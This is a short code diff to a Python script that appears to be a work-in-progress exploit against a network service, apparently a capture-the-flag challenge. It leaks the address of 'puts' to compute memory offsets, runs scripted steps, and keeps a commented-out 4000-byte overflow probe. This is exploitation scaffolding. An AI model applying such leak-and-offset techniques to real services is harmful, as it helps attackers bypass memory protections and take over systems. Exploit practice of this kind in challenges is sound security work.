@@ -29,7 +29,7 @@ def connect():
 def send(msg: str):
     conn.send(msg.encode())
     sleep(SLEEP_LEN)
-    return conn.recv(RECV_SIZE)
+    return conn.recv(RECV_SIZE).decode()
 
 
 def run_steps(steps: str):
@@ -46,13 +46,17 @@ try:
 
     # get address of puts
     pattern = r"0x[0-9a-f]+"
-    puts_addr = re.findall(pattern, res.decode())[0]
+    puts_addr = re.findall(pattern, res)[0]
     print(f"Address of `puts`: {puts_addr}")
 
     def puts_offset(addr):
         return hex(int(puts_addr, 16) + int(addr, 16))
 
-    #
+    print(run_steps("2_write_book.txt"))
+
+    # this part has to be done in the script,
+    # because it calculates the offset
+    # print(send("a" * 4000))
 
     # Close the socket
     conn.close()
